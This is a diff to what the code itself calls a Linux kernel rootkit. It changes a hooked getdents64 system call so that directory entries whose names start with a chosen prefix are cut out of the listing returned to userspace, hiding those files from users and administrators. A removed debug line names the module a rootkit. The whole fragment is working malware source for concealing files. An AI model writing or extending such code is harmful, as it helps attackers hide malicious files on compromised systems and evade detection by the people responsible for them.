@@ -73,7 +73,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	unsigned long offset=0;
 	struct linux_dirent64 __user *dirent=(struct linux_dirent64*)regs->si;
 	
-	struct linux_dirent64 *dirent_ker,*current_dir = NULL;
+	struct linux_dirent64 *dirent_ker,*current_dir,*previous_dir = NULL;
 
 	int ret=orig_getdents64(regs);
 	dirent_ker=kzalloc(ret,GFP_KERNEL);
@@ -92,8 +92,18 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 		current_dir=(void *)dirent_ker+offset;
 
 		if(memcmp(PREFIX,current_dir->d_name,strlen(PREFIX))==0){
-			printk(KERN_DEBUG "rootkit wazzzaaaaaaa: %s",current_dir->d_name);
+			if(current_dir==dirent_ker){
+				ret-=current_dir->d_reclen;
+				memmove(current_dir,(void *)current_dir+current_dir->d_reclen,ret);
+				continue;
 		}
+			previous_dir->d_reclen+=current_dir->d_reclen;
+		}
+
+		else{
+			previous_dir=current_dir;
+		}
+
 		offset+=current_dir->d_reclen;
 	}
 	error=copy_to_user(dirent,dirent_ker,ret);
